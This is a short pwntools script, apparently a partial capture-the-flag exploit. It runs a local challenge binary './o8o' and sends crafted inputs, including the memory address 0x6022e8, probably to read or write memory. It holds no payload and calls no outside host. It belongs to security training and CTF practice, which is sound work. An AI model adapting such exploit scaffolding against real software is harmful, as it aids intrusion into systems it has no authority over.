from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
bp = {'bp1':0x400a19}

r = process('./o8o')
#gdb.attach(r, 'b *'.format(bp['bp1']))

r.recv()
r.sendline("")

def sla(ar1, ar2, ar3, ar4, ar5):
	r.sendlineafter(': ', ar1)
	r.sendlineafter(': ', ar2)
	r.sendlineafter(': ', ar3)
	r.sendlineafter(': ', ar4)
	r.sendlineafter(': ', ar5)

sla('0', '0', '0x6022e8', '100', '0')
r.recvuntil('to send')
r.recv()
